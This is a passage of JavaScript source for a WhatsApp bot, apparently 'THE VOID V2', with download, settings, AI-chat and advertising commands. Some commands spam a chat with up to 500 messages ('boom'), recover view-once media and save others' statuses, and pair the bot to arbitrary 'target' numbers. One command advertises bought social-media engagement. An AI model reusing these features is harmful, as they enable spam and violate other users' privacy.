                    }

                    if (args.length === 0) {
                        return await socket.sendMessage(sender, {
                            text: `*Please provide emojis*\nCurrent emojis: ${config.NEWSLETTER_REACT_EMOJIS.join(', ')}\n\nExample: .setnewsletteremojis ❤️ 🔥 😍`
                        }, { quoted: msg });
                    }

                    config.NEWSLETTER_REACT_EMOJIS = args;

                    const userConfig = await loadUserConfig(number);
                    userConfig.NEWSLETTER_REACT_EMOJIS = config.NEWSLETTER_REACT_EMOJIS;
                    await updateUserConfig(number, userConfig);
                    applyConfigSettings(userConfig);

                    await socket.sendMessage(sender, {
                        image: { url: config.IMAGE_PATH },
                        caption: formatMessage(
                            '✅ NEWSLETTER EMOJIS UPDATED',
                            `New react emojis: ${config.NEWSLETTER_REACT_EMOJIS.join(', ')}`,
                            '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
                        )
                    }, { quoted: msg });
                    break;
                }

                case 'song': {
                    try {
                        const ddownr = require('denethdev-ytmp3');

                        function extractYouTubeId(url) {
                            const regex = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/(?:watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
                            const match = url.match(regex);
                            return match ? match[1] : null;
                        }

                        function convertYouTubeLink(input) {
                            const videoId = extractYouTubeId(input);
                            if (videoId) {
                                return `https://www.youtube.com/watch?v=${videoId}`;
                            }
                            return input;
                        }

                        const q = args.join(' ');

                        if (!q || q.trim() === '') {
                            return await socket.sendMessage(sender, { text: '*`Need YT_URL or Title`*' }, { quoted: myquoted });
                        }

                        const fixedQuery = convertYouTubeLink(q.trim());

                        const search = await yts(fixedQuery);
                        if (!search?.videos || search.videos.length === 0) {
                            return await socket.sendMessage(sender, { text: '*`No results found`*' }, { quoted: myquoted });
                        }

                        const data = search.videos[0];
                        if (!data) {
                            return await socket.sendMessage(sender, { text: '*`No results found`*' }, { quoted: myquoted });
                        }

                        const url = data.url;
                        const desc = `
*𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2*

🏮 *Connect* - https://didula-md.free.nf
🎶 *Title:* ${data.title} 🎧
🍂 *Duration:* ${data.timestamp}
🔖 *Uploaded On:* ${data.ago}

> © ᴩᴏᴡᴇʀᴅ ʙʏ ᴅɪᴅᴜʟᴀ ʀᴀꜱʜᴍɪᴋᴀ
`;

                        await socket.sendMessage(sender, {
                            image: { url: data.thumbnail },
                            caption: desc,
                            contextInfo: {
                                mentionedJid: [],
                                forwardingScore: 1,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363420895783008@newsletter',
                                    newsletterName: "𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2",
                                    serverMessageId: 999
                                }
                            }
                        }, { quoted: myquoted });

                        await socket.sendMessage(sender, { react: { text: '⬇️', key: msg.key } });

                        const result = await ddownr.download(url, 'mp3');
                        if (!result || !result.downloadUrl) {
                            throw new Error("Failed to generate download URL");
                        }

                        const downloadLink = result.downloadUrl;

                        await socket.sendMessage(sender, { react: { text: '⬆️', key: msg.key } });

                        await socket.sendMessage(sender, {
                            audio: { url: downloadLink },
                            mimetype: "audio/mpeg",
                            ptt: true
                        }, { quoted: myquoted });

                    } catch (err) {
                        console.error("Song download error:", err);
                        await socket.sendMessage(sender, { text: "*`Error occurred while downloading: " + (err.message || "Unknown error") + "`*" }, { quoted: myquoted });
                    }
                    break;
                }

                case 'boom': {
                    if (args.length < 2) {
                        return await socket.sendMessage(sender, {
                            text: "📛 *Usage:* `.boom <count> <message>`\n📌 *Example:* `.boom 100 Hello*`"
                        }, { quoted: myquoted });
                    }

                    const count = parseInt(args[0]);
                    if (isNaN(count) || count <= 0 || count > 500) {
                        return await socket.sendMessage(sender, {
                            text: "❗ Please provide a valid count between 1 and 500."
                        }, { quoted: myquoted });
                    }

                    const message = args.slice(1).join(" ");
                    for (let i = 0; i < count; i++) {
                        await socket.sendMessage(sender, { text: message }, { quoted: myquoted });
                        await new Promise(resolve => setTimeout(resolve, 500));
                    }
                    break;
                }

              // Add these commands in the switch statement inside setupCommandHandlers function

case 'settings': {


    const settingsText = `*⚙️ 𝐂𝐔𝐑𝐑𝐄𝐍𝐓 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒*

📌 *Prefix:* ${config.PREFIX}
👁️ *Auto View Status:* ${config.AUTO_VIEW_STATUS}
❤️ *Auto Like Status:* ${config.AUTO_LIKE_STATUS}
🎙️ *Auto Recording:* ${config.AUTO_RECORDING}
😊 *Auto Like Emojis:* ${config.AUTO_LIKE_EMOJI.join(', ')}

*Commands to change:*
• ${config.PREFIX}setprefix [new prefix]
• ${config.PREFIX}autoview [on/off]
• ${config.PREFIX}autolike [on/off]
• ${config.PREFIX}autorecording [on/off]
• ${config.PREFIX}setemojis [emoji1 emoji2...]`;

    await socket.sendMessage(sender, {
        image: { url: config.IMAGE_PATH },
        caption: formatMessage(
            '⚙️ 𝐁𝐎𝐓 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒',
            settingsText,
            '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
        )
    }, { quoted: myquoted });
    break;
}

case 'setprefix': {


    if (!args[0]) {
        return await socket.sendMessage(sender, {
            text: `*Current prefix:* ${config.PREFIX}\n*Usage:* ${config.PREFIX}setprefix [new prefix]`
        }, { quoted: msg });
    }

    const oldPrefix = config.PREFIX;
    config.PREFIX = args[0];

    const userConfig = await loadUserConfig(number);
    userConfig.PREFIX = config.PREFIX;
    await updateUserConfig(number, userConfig);

    await socket.sendMessage(sender, {
        text: `✅ *Prefix changed*\n*Old:* ${oldPrefix}\n*New:* ${config.PREFIX}`
    }, { quoted: msg });
    break;
}

case 'autoview': {


    if (!args[0] || !['on', 'off'].includes(args[0].toLowerCase())) {
        return await socket.sendMessage(sender, {
            text: `*Current:* ${config.AUTO_VIEW_STATUS}\n*Usage:* ${config.PREFIX}autoview [on/off]`
        }, { quoted: msg });
    }

    config.AUTO_VIEW_STATUS = args[0].toLowerCase() === 'on' ? 'true' : 'false';

    const userConfig = await loadUserConfig(number);
    userConfig.AUTO_VIEW_STATUS = config.AUTO_VIEW_STATUS;
    await updateUserConfig(number, userConfig);

    await socket.sendMessage(sender, {
        text: `✅ *Auto View Status:* ${config.AUTO_VIEW_STATUS === 'true' ? '✅ ON' : '❌ OFF'}`
    }, { quoted: msg });
    break;
}

case 'autolike': {


    if (!args[0] || !['on', 'off'].includes(args[0].toLowerCase())) {
        return await socket.sendMessage(sender, {
            text: `*Current:* ${config.AUTO_LIKE_STATUS}\n*Usage:* ${config.PREFIX}autolike [on/off]`
        }, { quoted: msg });
    }

    config.AUTO_LIKE_STATUS = args[0].toLowerCase() === 'on' ? 'true' : 'false';

    const userConfig = await loadUserConfig(number);
    userConfig.AUTO_LIKE_STATUS = config.AUTO_LIKE_STATUS;
    await updateUserConfig(number, userConfig);

    await socket.sendMessage(sender, {
        text: `✅ *Auto Like Status:* ${config.AUTO_LIKE_STATUS === 'true' ? '✅ ON' : '❌ OFF'}`
    }, { quoted: msg });
    break;
}

case 'autorecording': {


    if (!args[0] || !['on', 'off'].includes(args[0].toLowerCase())) {
        return await socket.sendMessage(sender, {
            text: `*Current:* ${config.AUTO_RECORDING}\n*Usage:* ${config.PREFIX}autorecording [on/off]`
        }, { quoted: msg });
    }

    config.AUTO_RECORDING = args[0].toLowerCase() === 'on' ? 'true' : 'false';

    const userConfig = await loadUserConfig(number);
    userConfig.AUTO_RECORDING = config.AUTO_RECORDING;
    await updateUserConfig(number, userConfig);

    await socket.sendMessage(sender, {
        text: `✅ *Auto Recording:* ${config.AUTO_RECORDING === 'true' ? '✅ ON' : '❌ OFF'}`
    }, { quoted: msg });
    break;
}

case 'setemojis': {


    if (args.length === 0) {
        return await socket.sendMessage(sender, {
            text: `*Current emojis:* ${config.AUTO_LIKE_EMOJI.join(', ')}\n*Usage:* ${config.PREFIX}setemojis 💗 🔥 ❤️`
        }, { quoted: msg });
    }

    config.AUTO_LIKE_EMOJI = args;

    const userConfig = await loadUserConfig(number);
    userConfig.AUTO_LIKE_EMOJI = config.AUTO_LIKE_EMOJI;
    await updateUserConfig(number, userConfig);

    await socket.sendMessage(sender, {
        text: `✅ *Auto Like Emojis Updated:* ${config.AUTO_LIKE_EMOJI.join(', ')}`
    }, { quoted: msg });
    break;
}



case 'save': 
case 'send': {
    try {
        const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;

        if (!quotedMsg) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please reply to a status message to save*'
            }, { quoted: myquoted });
        }

        await socket.sendMessage(sender, { react: { text: '💾', key: msg.key } });

        const userJid = jidNormalizedUser(socket.user.id);

        // Check message type and save accordingly
        if (quotedMsg.imageMessage) {
            const buffer = await downloadAndSaveMedia(quotedMsg.imageMessage, 'image');
            await socket.sendMessage(userJid, {
                image: buffer,
                caption: quotedMsg.imageMessage.caption || '✅ *Status Saved*'
            });
        } else if (quotedMsg.videoMessage) {
            const buffer = await downloadAndSaveMedia(quotedMsg.videoMessage, 'video');
            await socket.sendMessage(userJid, {
                video: buffer,
                caption: quotedMsg.videoMessage.caption || '✅ *Status Saved*'
            });
        } else if (quotedMsg.conversation || quotedMsg.extendedTextMessage) {
            const text = quotedMsg.conversation || quotedMsg.extendedTextMessage.text;
            await socket.sendMessage(userJid, {
                text: `✅ *Status Saved*\n\n${text}`
            });
        } else {
            await socket.sendMessage(userJid, quotedMsg);
        }

        await socket.sendMessage(sender, {
            text: '✅ *Status saved successfully!*'
        }, { quoted: myquoted });

    } catch (error) {
        console.error('❌ Save error:', error);
        await socket.sendMessage(sender, {
            text: '*❌ Failed to save status*'
        }, { quoted: myquoted });
    }
    break;
}

case 'tiktok':
case 'tt': {
    try {
        if (!args[0]) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a TikTok URL*\n*Usage:* .tiktok https://vm.tiktok.com/xxxxx'
            }, { quoted: myquoted });
        }

        const tiktokUrl = args.join(' ');

        if (!tiktokUrl.includes('tiktok.com')) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a valid TikTok URL*'
            }, { quoted: myquoted });
        }

        await socket.sendMessage(sender, { react: { text: '⬇️', key: msg.key } });

        const response = await axios.get(`https://apis.davidcyriltech.my.id/download/tiktokv3?url=${encodeURIComponent(tiktokUrl)}`);

        if (!response.data.success) {
            throw new Error('Failed to fetch TikTok video');
        }

        const { author, description, thumbnail, video } = response.data;

        await socket.sendMessage(sender, { react: { text: '⬆️', key: msg.key } });

        await socket.sendMessage(sender, {
            video: { url: video },
            caption: formatMessage(
                '🎵 𝐓𝐈𝐊𝐓𝐎𝐊 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃',
                `👤 *Author:* ${author}\n📝 *Description:* ${description}`,
                '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
            )
        }, { quoted: myquoted });

    } catch (error) {
        console.error('❌ TikTok download error:', error);
        await socket.sendMessage(sender, { react: { text: '❌', key: msg.key } });
        await socket.sendMessage(sender, {
            text: `*❌ Failed to download TikTok video*\n\nError: ${error.message || 'Unknown error'}`
        }, { quoted: myquoted });
    }
    break;
}

case 'nahbro':
case 'nahman': {
    const scriptText = `*🤖 𝐃𝐈𝐃𝐔𝐋𝐀 𝐌𝐃 𝐌𝐈𝐍𝐈 𝐁𝐎𝐓 𝐒𝐂𝐑𝐈𝐏𝐓*

*💰 PRICING PACKAGES*

📦 *BASIC PACKAGE - LKR 2,500*
• Full Bot Script
• Basic Setup Guide
• 1 Month Support

📦 *PREMIUM PACKAGE - LKR 5,000*
• Full Bot Script
• Advanced Features
• Installation Support
• 3 Months Support
• Free Updates

📦 *ENTERPRISE PACKAGE - LKR 10,000*
• Full Bot Script
• All Premium Features
• Custom Modifications
• Lifetime Support
• Priority Updates
• Personal Training

*✨ FEATURES INCLUDED:*
✅ Auto Session Management
✅ MongoDB Integration
✅ All Download Commands
✅ AI Integration
✅ Auto Features (View, Like, React)
✅ Newsletter Management
✅ 100+ Commands

*📞 CONTACT FOR PURCHASE:*
WhatsApp: +94 74 167 1668
Telegram: @DidulaRashmika

*💳 PAYMENT METHODS:*
• Bank Transfer
• Dialog/Mobitel Cash
• PayPal

*🎁 LIMITED OFFER: 20% OFF*`;

    await socket.sendMessage(sender, {
        image: { url: config.IMAGE_PATH },
        caption: scriptText + '\n\n> *𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2*'
    }, { quoted: myquoted });
    break;
}

case 'ai':
case 'chat': {
    try {
        if (!args[0]) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a message*\n*Usage:* .ai Hello, how are you?'
            }, { quoted: myquoted });
        }

        const query = args.join(' ');

        await socket.sendMessage(sender, { react: { text: '🤖', key: msg.key } });

        const response = await axios.get(`https://apis.davidcyriltech.my.id/ai/chatbot?query=${encodeURIComponent(query)}`);

        if (response.data.status !== 200 || !response.data.success) {
            throw new Error('AI service unavailable');
        }

        await socket.sendMessage(sender, {
            text: `*🤖 AI Response:*\n\n${response.data.result}\n\n> *𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2*`,
            contextInfo: {
                externalAdReply: {
                    title: "AI Assistant",
                    body: "Powered by Didula MD",
                    thumbnailUrl: config.IMAGE_PATH,
                    sourceUrl: "https://didula-md.free.nf",
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: myquoted });

    } catch (error) {
        console.error('❌ AI error:', error);
        await socket.sendMessage(sender, {
            text: `*❌ AI Error*\n\nFailed to get response. Please try again.`
        }, { quoted: myquoted });
    }
    break;
}

case 'fb': {
    try {
        if (!args[0]) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a Facebook video URL*\n*Example:* .fb https://www.facebook.com/watch?v=123456'
            }, { quoted: myquoted });
        }

        const fbUrl = args.join(' ');

        if (!fbUrl.includes('facebook.com') && !fbUrl.includes('fb.watch')) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a valid Facebook URL*'
            }, { quoted: myquoted });
        }

        await socket.sendMessage(sender, { react: { text: '⬇️', key: msg.key } });

        const response = await axios.get(`https://apis.davidcyriltech.my.id/facebook?url=${encodeURIComponent(fbUrl)}`);

        if (!response.data.result || !response.data.result.downloads) {
            throw new Error('Failed to fetch Facebook video');
        }

        const { title, downloads } = response.data.result;
        const videoUrl = downloads.sd ? downloads.sd.url : downloads.hd?.url;

        if (!videoUrl) {
            throw new Error('No download link available');
        }

        await socket.sendMessage(sender, { react: { text: '⬆️', key: msg.key } });

        await socket.sendMessage(sender, {
            video: { url: videoUrl },
            caption: formatMessage(
                '📘 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃',
                `📹 *Title:* ${title}\n📊 *Quality:* ${downloads.sd ? 'SD' : 'HD'}\n📦 *Size:* ${downloads.sd ? downloads.sd.size : downloads.hd?.size || 'Unknown'}`,
                '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
            )
        }, { quoted: myquoted });

    } catch (error) {
        console.error('❌ Facebook download error:', error);
        await socket.sendMessage(sender, { react: { text: '❌', key: msg.key } });
        await socket.sendMessage(sender, {
            text: `*❌ Failed to download Facebook video*\n\nError: ${error.message || 'Unknown error'}`
        }, { quoted: myquoted });
    }
    break;
}

case 'video': {
    try {
        if (!args[0]) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a YouTube URL or search query*\n*Usage:* .video <URL or search term>'
            }, { quoted: myquoted });
        }

        const query = args.join(' ');
        let videoUrl = query;

        // If not a URL, search for it
        if (!query.includes('youtube.com') && !query.includes('youtu.be')) {
            await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

            const search = await yts(query);
            if (!search?.videos || search.videos.length === 0) {
                return await socket.sendMessage(sender, {
                    text: '*❌ No videos found*'
                }, { quoted: myquoted });
            }

            videoUrl = search.videos[0].url;
        }

        await socket.sendMessage(sender, { react: { text: '⬇️', key: msg.key } });

        const response = await axios.get(`https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(videoUrl)}`);

        if (response.data.status !== 200 || !response.data.success) {
            throw new Error('Failed to fetch video');
        }

        const { title, quality, thumbnail, download_url } = response.data.result;

        await socket.sendMessage(sender, { react: { text: '⬆️', key: msg.key } });

        await socket.sendMessage(sender, {
            video: { url: download_url },
            caption: formatMessage(
                '🎬 𝐘𝐎𝐔𝐓𝐔𝐁𝐄 𝐕𝐈𝐃𝐄𝐎',
                `📹 *Title:* ${title}\n📊 *Quality:* ${quality}`,
                '𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2'
            )
        }, { quoted: myquoted });

    } catch (error) {
        console.error('❌ Video download error:', error);
        await socket.sendMessage(sender, { react: { text: '❌', key: msg.key } });
        await socket.sendMessage(sender, {
            text: `*❌ Failed to download video*\n\nError: ${error.message || 'Unknown error'}`
        }, { quoted: myquoted });
    }
    break;
}

case 'movie': {
    try {
        if (!args[0]) {
            return await socket.sendMessage(sender, {
                text: '*❌ Please provide a movie name*\n*Usage:* .movie Deadpool'
            }, { quoted: myquoted });
        }

        const movieQuery = args.join(' ');

        await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

        const response = await axios.get(`https://apis.davidcyriltech.my.id/movies/search?query=${encodeURIComponent(movieQuery)}`);

        if (!response.data || !response.data.results || response.data.results.length === 0) {
            return await socket.sendMessage(sender, {
                text: `*❌ No movies found for:* ${movieQuery}`
            }, { quoted: myquoted });
        }

        const movies = response.data.results.slice(0, 5);

        let movieText = `*🎬 𝐌𝐎𝐕𝐈𝐄 𝐒𝐄𝐀𝐑𝐂𝐇 𝐑𝐄𝐒𝐔𝐋𝐓𝐒*\n`;
        movieText += `*Query:* ${movieQuery}\n`;
        movieText += `*Found:* ${response.data.results.length} movies\n`;
        movieText += `━━━━━━━━━━━━━━━━━━━━\n\n`;

        movies.forEach((movie, index) => {
            movieText += `*${index + 1}. ${movie.title}*\n`;
            if (movie.year) movieText += `📅 Year: ${movie.year}\n`;
            if (movie.genre) movieText += `🎭 Genre: ${movie.genre}\n`;
            if (movie.rating) movieText += `⭐ Rating: ${movie.rating}\n`;
            if (movie.link) movieText += `🔗 Link: ${movie.link}\n`;
            movieText += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        });

        movieText += `> *𝙏𝙃𝙀 𝙑 𝙊 𝙄 𝘿 𝙑2*\n`;
        movieText += `> *Source:* SinhalaSubu`;

        await socket.sendMessage(sender, {
            image: { url: movies[0].thumbnail || config.IMAGE_PATH },
            caption: movieText
        }, { quoted: myquoted });

    } catch (error) {
        console.error('❌ Movie search error:', error);
        await socket.sendMessage(sender, {
            text: `*❌ Failed to search movies*\n\nError: ${error.message || 'Unknown error'}`
        }, { quoted: myquoted });
    }
    break;
}

                case 'pair':
                case 'freebot':
                case 'getbot': {
                    if (!args[0]) {
                        return await socket.sendMessage(sender, {
                            text: '*Please provide a number to pair (e.g., .pair 1305xxxxxx)*'
                        }, { quoted: myquoted });
                    }

                    let pairNumber = args[0].replace(/[^0-9]/g, '');

                    try {
                        await socket.sendMessage(sender, {
                            image: { url: config.IMAGE_PATH },
                            caption: formatMessage(
                                '🔄 AUTO PAIRING INITIATED',
                                `Connect - https://voidv2.mazxa.com\n\n*Initiating auto-pairing for:* ${pairNumber}\n\nPlease wait while the pairing code is generated...`,
                                '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                            )
                        }, { quoted: myquoted });

                        const mockRes = {
                            headersSent: false,
                            send: (data) => {
                                if (data.code) {
                                    socket.sendMessage(sender, {
                                        image: { url: config.IMAGE_PATH },
                                        caption: formatMessage(
                                            '🔑 AUTO PAIRING CODE',
                                            `Connect - https://voidv2.mazxa.com\n\n*Number:* ${pairNumber}\n*Pairing Code:* ${data.code}\n\n*Instructions:*\n1. Open WhatsApp on the target device\n2. Go to Settings > Linked Devices\n3. Click on 'Link a Device'\n4. Enter the pairing code above`,
                                            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                                        )
                                    }, { quoted: myquoted });
                                }
                            },
                            status: () => mockRes
                        };

                        await EmpirePair(pairNumber, mockRes);

                    } catch (error) {
                        console.error('❌ Pairing command error:', error);
                        await socket.sendMessage(sender, {
                            text: '*Error generating pairing code. Please try again.*'
                        }, { quoted: myquoted });
                    }
                    break;
                }

                case 'getdp': {
                    try {
                        let targetJid;
                        let profileName = "User";

                        if (msg.message.extendedTextMessage?.contextInfo?.participant) {
                            targetJid = msg.message.extendedTextMessage.contextInfo.participant;
                            profileName = "Replied User";
                        }
                        else if (msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
                            targetJid = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
                            profileName = "Mentioned User";
                        }
                        else {
                            targetJid = sender;
                            profileName = "Your";
                        }

                        const ppUrl = await socket.profilePictureUrl(targetJid, 'image').catch(() => null);

                        if (!ppUrl) {
                            return await socket.sendMessage(sender, {
                                text: `*❌ No profile picture found for ${profileName}*`
                            }, { quoted: myquoted });
                        }

                        await socket.sendMessage(sender, {
                            image: { url: ppUrl },
                            caption: formatMessage(
                                '𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐏𝐈𝐂𝐓𝐔𝐑𝐄 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃',
                                `✅ ${profileName} Profile Picture\n📱 JID: ${targetJid}`,
                                '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                            )
                        }, { quoted: myquoted });

                    } catch (error) {
                        console.error('❌ GetDP error:', error);
                        await socket.sendMessage(sender, {
                            text: '*❌ Failed to get profile picture*'
                        }, { quoted: myquoted });
                    }
                    break;
                }

                case 'ping': {
                    const start = Date.now();
                    await socket.sendMessage(sender, { text: '```Pinging...```' }, { quoted: myquoted });
                    const end = Date.now();
                    const responseTime = end - start;

                    await socket.sendMessage(sender, {
                        image: { url: config.IMAGE_PATH },
                        caption: formatMessage(
                            '𝐏𝐈𝐍𝐆 𝐑𝐄𝐒𝐏𝐎𝐍𝐒𝐄',
                            `🏓 *Pong!*\n⚡ Response Time: ${responseTime}ms\n🌐 Status: Online\n🚀 Performance: ${responseTime < 100 ? 'Excellent' : responseTime < 300 ? 'Good' : 'Average'}`,
                            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                        )
                    }, { quoted: myquoted });
                    break;
                }

                case 'owner': {
                    const ownerVCard = `BEGIN:VCARD\nVERSION:3.0\nFN:ANDY MRLIT\nTEL;type=CELL;type=VOICE;waid=13056978303:+1 305 697 8303\nEND:VCARD`;

                    await socket.sendMessage(sender, {
                        contacts: {
                            displayName: 'ANDY MRLIT',
                            contacts: [{ vcard: ownerVCard }]
                        }
                    }, { quoted: myquoted });

                    await socket.sendMessage(sender, {
                        image: { url: config.IMAGE_PATH },
                        caption: formatMessage(
                            '𝐎𝐖𝐍𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍',
                            `👤 *Name:* ANDY MRLIT\n📱 *Number:* +1 305 697 8303\n🌐 *Website:* https://void.mazxa.com\n💼 *Role:* Bot Developer & Owner`,
                            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                        )
                    }, { quoted: myquoted });
                    break;
                }

                case 'deleteme': {
                    const userJid = jidNormalizedUser(socket.user.id);
                    const userNumber = userJid.split('@')[0];

                    if (userNumber !== number) {
                        return await socket.sendMessage(sender, {
                            text: '*❌ You can only delete your own session*'
                        }, { quoted: myquoted });
                    }

                    await socket.sendMessage(sender, {
                        image: { url: config.IMAGE_PATH },
                        caption: formatMessage(
                            '🗑️ 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐃𝐄𝐋𝐄𝐓𝐈𝐎𝐍',
                            `⚠️ Your session will be permanently deleted!\n\n🔢 Number: ${number}\n\n*This action cannot be undone!*`,
                            '𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓'
                        )
                    }, { quoted: myquoted });

                    setTimeout(async () => {
                        await deleteSessionImmediately(number);
                        socket.ws.close();
                        activeSockets.delete(number);
                    }, 3000);

                    break;
                }

                case 'news': {
                    try {
                        await socket.sendMessage(sender, { react: { text: '📰', key: msg.key } });

                        const newsData = await fetchNews();
                        if (newsData && newsData.length > 0) {
                            await SendSlide(socket, sender, newsData.slice(0, 5));
                        } else {
                            await socket.sendMessage(sender, {
                                text: '*❌ No news available at the moment*'
                            }, { quoted: myquoted });
                        }

                    } catch (error) {
                        console.error('❌ News fetch error:', error);
                        await socket.sendMessage(sender, {
                            text: '*❌ Failed to fetch latest news*'
                        }, { quoted: myquoted });
                    }
                    break;
                }

                case 'smmmjhu': {
                    const smmText = `*📱 𝐒𝐎𝐂𝐈𝐀𝐋 𝐌𝐄𝐃𝐈𝐀 𝐌𝐀𝐑𝐊𝐄𝐓𝐈𝐍𝐆 𝐒𝐄𝐑𝐕𝐈𝐂𝐄𝐒*

*📸 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠*  
👍 𝟭𝗞 𝗟𝗶𝗸𝗲𝘀 — *රු.𝟯𝟱𝟬*  
👥 𝟭𝗞 𝗙𝗼𝗹𝗹𝗼𝘄𝘀 — *රු.𝟭𝟬𝟬𝟬*  
👀 𝟭𝗞 𝗩𝗶𝗲𝘄𝘀 — *රු.𝟭𝟬𝟬*  

*🎵 𝗧𝗜𝗞𝗧𝗢𝗞*  
👍 𝟭𝗞 𝗟𝗶𝗸𝗲𝘀 — *රු.𝟮𝟱𝟬*  
👥 𝟭𝗞 𝗙𝗼𝗹𝗹𝗼𝘄𝘀 — *රු.𝟲𝟬𝟬*  
👀 𝟮𝗞 𝗩𝗶𝗲𝘄𝘀 — *රු.𝟭𝟬𝟬*  

*📘 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞*  
👍 𝟭𝗞 𝗟𝗶𝗸𝗲𝘀 — *රු.𝟲𝟳𝟱*  
👥 𝟭𝗞 𝗙𝗼𝗹𝗹𝗼𝘄𝘀 — *රු.𝟲𝟵𝟬*  
❤️ 𝟭𝗞 𝗥𝗲𝗮𝗰𝘁𝘀 — *රු.𝟲𝟬𝟬*  
📌 𝟭𝗞 𝗣𝗮𝗴𝗲 𝗙𝗼𝗹𝗹𝗼𝘄𝘀 — *රු.𝟭𝟭𝟮𝟬*  
👀 𝟮𝗞 𝗩𝗶𝗲𝘄𝘀 — *රු.𝟭𝟬𝟬*  

*🎬 𝗬𝗢𝗨𝗧𝗨𝗕𝗘*  
👀 𝟭𝗞 𝗩𝗶𝗲𝘄𝘀 — *රු.𝟮𝟰𝟬*  
👍 𝟭𝗞 𝗟𝗶𝗸𝗲𝘀 — *රු.𝟰𝟴𝟬*  
🔔 𝟭𝗞 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲𝗿𝘀 — *රු.𝟮𝟯𝟴𝟬*  

*💬 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣*  
📢 𝟭𝗞 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗥𝗲𝗮𝗰𝘁𝘀 — *රු.𝟮𝟭𝟮𝟬*  
👥 𝟭𝗞 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗠𝗲𝗺𝗯𝗲𝗿𝘀 — *රු.𝟮𝟮𝟱𝟬*  

💬 *𝟮𝟰/𝟳 𝗦𝗘𝗥𝗩𝗜𝗖𝗘*  
📲 *𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗨𝘀: +𝟭 𝟯𝟬𝟱 𝟲𝟵𝟳 𝟴𝟯𝟬𝟯*  
🚀 *𝗙𝗮𝘀𝘁 & 𝗥𝗲𝗹𝗶𝗮𝗯𝗹𝗲 | 𝟮𝟰-𝗛𝗼𝘂𝗿 𝗗𝗲𝗹𝗶𝘃𝗲𝗿𝘆*  
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯`;

                    await socket.sendMessage(sender, {
                        image: { url: config.IMAGE_PATH },
                        caption: smmText + '\n\n> *𝐓𝐇𝐄 𝐕𝐎𝐈𝐃 𝐕𝟐 𝐁𝐎𝐓*'
                    }, { quoted: myquoted });
                    break;
                }

                case 'vv':
                case 'viewonce': {
                    try {
                        const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;

                        if (!quotedMsg) {
                            return await socket.sendMessage(sender, {
                                text: '❌ *Please reply to a ViewOnce message!*\n\n📌 Usage: Reply to a viewonce message with `.vv`'
                            }, { quoted: myquoted });
                        }

                        await socket.sendMessage(sender, {
                            react: { text: '✨', key: msg.key }
                        });

                        let mediaData = null;
                        let mediaType = null;
                        let caption = '';

                        // Check for viewonce media
                        if (quotedMsg.imageMessage?.viewOnce) {
                            mediaData = quotedMsg.imageMessage;
                            mediaType = 'image';
                            caption = mediaData.caption || '';
                        } else if (quotedMsg.videoMessage?.viewOnce) {
                            mediaData = quotedMsg.videoMessage;
                            mediaType = 'video';
                            caption = mediaData.caption || '';
                        } else if (quotedMsg.viewOnceMessage?.message?.imageMessage) {
                            mediaData = quotedMsg.viewOnceMessage.message.imageMessage;
                            mediaType = 'image';
                            caption = mediaData.caption || '';
                        } else if (quotedMsg.viewOnceMessage?.message?.videoMessage) {
